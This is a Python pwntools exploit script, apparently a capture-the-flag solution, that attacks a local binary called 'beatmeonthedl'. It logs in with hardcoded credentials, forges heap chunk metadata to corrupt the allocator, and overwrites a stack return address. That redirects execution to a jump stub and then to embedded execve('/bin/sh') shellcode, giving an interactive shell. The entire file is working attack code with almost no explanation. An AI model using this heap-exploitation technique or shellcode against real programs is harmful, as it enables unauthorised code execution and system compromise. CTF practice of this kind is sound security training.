from pwn import *

#class for the process object (to make it easy to interface and exploit)
class Pwnable:
    def __init__(self, p):
        self.p = p 
    
    #these are pretty self explanatory
    def login(self):        
        print("[+] Logging into lair")
        username = "mcfly\n"
        password = "awesnap\n"
        #print(self.p.recvuntil('username:'))
        self.p.recvuntil('username:')
        self.p.send(username)
        #print(self.p.recvuntil('Pass:'))
        self.p.recvuntil('Pass:')
        self.p.send(password)
        #print(self.p.recv())
        sleep(0.5)

    def add_exploit(self,expstr):
        print("[+] Creating exploit %s" % expstr)
        self.p.send("1\n")
        #print(self.p.recvuntil('text >'))
        self.p.recvuntil('>')
        self.p.send(expstr+"\n")
        #print(self.p.recvuntil('|'))
        sleep(0.5)
    
    def print_exploits(self):
        print("[+] Current exploits in database")
        self.p.send("2\n")
        #print(self.p.recvuntil('|'))

    def delete_exploit(self, expid):
        print("[+] Deleting exploit %s" % expid)
        self.p.send("3\n")
        #print(self.p.recvuntil('choice:'))
        self.p.recvuntil('choice:')
        self.p.send(expid + '\n')
        #print(self.p.recvuntil('|'))
     
    def change_exploit(self, expid, data):
        print("[+] Changing exploit %s" % expid)
        self.p.send('4\n')
        #print(self.p.recvuntil('choice:'))
        self.p.recvuntil('choice:')
        self.p.send(expid+'\n')
        #print(self.p.recvuntil('data:'))
        self.p.recvuntil('data:')
        self.p.send(data)
        #print(self.p.recvuntil('|'))

p = process('./beatmeonthedl')

print("[+] ./beatmeonthedl %d" % p.pid)

beat = Pwnable(p)

#lets login
beat.login()

# ------ EINHERJAR method ------
#1. create 5 chunks. 
beat.add_exploit("A"*8)
beat.add_exploit("B"*8)
beat.add_exploit("C"*8)
beat.add_exploit("D"*8)
beat.add_exploit("E"*8)


#this is our shellcode chunk for us to jump to. 
shell_chunk = "\x90"*21 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#this is our rop chunk where we set up for our jump into our shellcode chunk. 
rop_chunk = "\x90"*39 + "\x48\xC7\xC0\xB4\xA0\x60\x00" + "\xFF\xE0" 
#mov rax, 0x60a0b4
#jmp rax 

#address in the heap where we can jump & not overwrite our own values.
returning_to = p64(0x60a110)

#return address on the stack
ret_addr = p64(0x7fffffffe1f8-24)

#1. craft the 'free' chunk [64-bytes] + [prev-size 0x0] + [size 0xe41] + [where] + [what] 
free_chunk = "A"*64 + p64(0x0) + p64(0xe41) + ret_addr + returning_to
beat.change_exploit("4", free_chunk)

#2. craft the 'used' chunk [rop-chunk] + [prev-size 0x0] + [size 0x53 (1010011)] + [padding] 
used_chunk = rop_chunk + p64(0x0) + p64(0x53) + "\x00"*48
beat.change_exploit("3", used_chunk)

#3. craft a chunk with our shell_chunk so we can jump to it in our rop_chunk
beat.change_exploit("2", shell_chunk)

#now, if we attempt to free the third chunk, it should segfault within free()
#gdb.attach(p, '''
#b *main+178
#continue
#''')

#[+++] let the magic happen [+++]
print("[+++] let the magic happen [+++]")
beat.delete_exploit("4")
beat.p.sendline("lol")
p.interactive()
